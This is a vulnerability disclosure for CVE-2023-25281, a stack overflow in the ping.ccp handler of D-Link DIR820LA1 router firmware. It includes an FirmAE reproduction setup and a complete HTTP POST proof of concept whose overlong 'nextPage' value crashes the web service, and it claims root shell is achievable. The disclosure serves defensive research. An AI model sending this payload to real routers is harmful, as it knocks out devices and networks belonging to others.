# D-link DIR820LA1_FW105B03 Stack Overflow vulnerability

A stack overflow  vulnerability exists in pingV4Msg of component "/ping.ccp" of D-Link DIR820LA1_FW105B03, allowing an attacker to elevate privileges to root via a crafted payload.

## Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663

## 1. Affected version

DIR820LA1_FW105B03

## Vulnerability details

The file directory where the vulnerability is located:`/sbin/ncc2`

The `sub_49E5B0` function obtains the content of the variable `nextPage`  from the request of `/ping.ccp`, use strcpy to copy input data. The length of the string is not considered, and the stack overflows when the input is too long.

![vuln1](vuln1.png)

The ccp_ping function references the vulnerable `sub_49E5B0` function when the ccp_act parameter is set to cancelPing.

![vuln2](vuln2.png)



## Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Use the FirmAE simulation firmware DIR820LA1_FW105B03.bin

​	<img src="firmAE.png" alt="firmAE" style="zoom:70%;" /><img src="FirmAE2.png" alt="FirmAE2" style="zoom:70%;" />

2. Attack with the following POC attacks

​	**Attack Vector**：`ccp_act=cancelPing&nextPage=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

- Run the poc, the router's web service will crash

```xml
POST /ping.ccp HTTP/1.1
Host: 192.168.0.1
Content-Length: 760
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.0.1
Referer: http://192.168.0.1/lan.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: hasLogin=1
Connection: close

ccp_act=cancelPing&nextPage=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Finally, you can write exp, which can achieve a very stable effect of obtaining the root shell.



## Disclosure

- Feb 7, 2023:Public disclosure

- Mar 7, 2023:Assign CVE number CVE-2023-25281